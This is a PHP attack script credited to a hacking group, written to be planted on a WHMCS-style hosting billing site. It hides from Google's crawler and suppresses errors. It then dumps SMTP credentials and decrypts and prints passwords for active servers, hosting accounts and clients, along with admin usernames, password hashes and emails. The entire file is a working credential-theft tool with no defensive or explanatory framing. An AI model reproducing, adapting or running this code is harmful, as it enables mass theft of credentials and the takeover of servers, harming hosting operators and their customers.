<?php
echo'
##         C0der by : Lov3rDns    ##<br>                         
##            www.Groupx3.Org     ##<br><br>';

set_time_limit(0);
@session_start();
@error_reporting(0);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
	header('HTTP/1.0 404 Not Found');
	exit;
}
include '/home/user/public_html/File/dbconnect.php';
include '/home/user/public_html/File/includes/functions.php';
include '/home/user/public_html/File/includes/clientfunctions.php';

echo '--------------------<br>';
echo '-List Table SMTP-<br>';
echo '--------------------<br>';

$result = mysql_query("SELECT * FROM tblconfiguration WHERE setting IN ('SMTPHost','SMTPPort','SMTPUsername','SMTPPassword')");

while($row = mysql_fetch_array($result))
  {
  echo $row['setting'] . " : " . $row['value'];
  echo "<br />";
  }

$where1['active'] = "1";
$result1 = select_query ('tblservers', '',$where1);

echo '--------------------<br>';
echo '-List Table Servers-<br>';
echo '--------------------<br>';

while ($row = mysql_fetch_array($result1)) {
    $ipaddress = $row['ipaddress'];
    $type = $row['type'];
    $username = $row['username'];
    $password = $row['password'];
    $plaintxt = decrypt($password,$cc_encryption_hash);
    echo "[$type] $ipaddress : $username : $plaintxt<br>";
}


$where['domainstatus'] = "Active";
$result2 = select_query ('tblhosting', '', $where);

echo '--------------------<br>';
echo '-List Table Hosting-<br>';
echo '--------------------<br>';

while ($row = mysql_fetch_array($result2)) {
    $domain = $row['domain'];
    $username = $row['username'];
    $password = $row['password'];
    $dedicatedip = $row['dedicatedip'];
    $plaintxt = decrypt($password,$cc_encryption_hash);
    if ($dedicatedip != '') { echo "[$domain] $dedicatedip : $username : $plaintxt<br>"; }
    else { echo "$domain : $username : $plaintxt<br>"; }
}

$result3 = select_query ('tblclients');
echo '--------------------<br>';
echo '-CLIENTS-<br>';
echo '--------------------<br>';

while ($row = mysql_fetch_array($result3)) {
    $email = $row['email'];
	$password = $row['password'];
	$notes = $row['notes'];	
    $plaintxt = decrypt($password,$cc_encryption_hash);
     echo "$email:$plaintxt : $notes <br>"; }

$result4 = select_query ('tbladmins');
echo '--------------------<br>';
echo '-ADMIN-<br>';
echo '--------------------<br>';

while ($row = mysql_fetch_array($result4)) {
    $admin = $row['username'];
	$password = $row['password'];
	$email = $row['email'];
     echo "$admin:$password  $email <br>"; }
echo '<br>Done!';
?>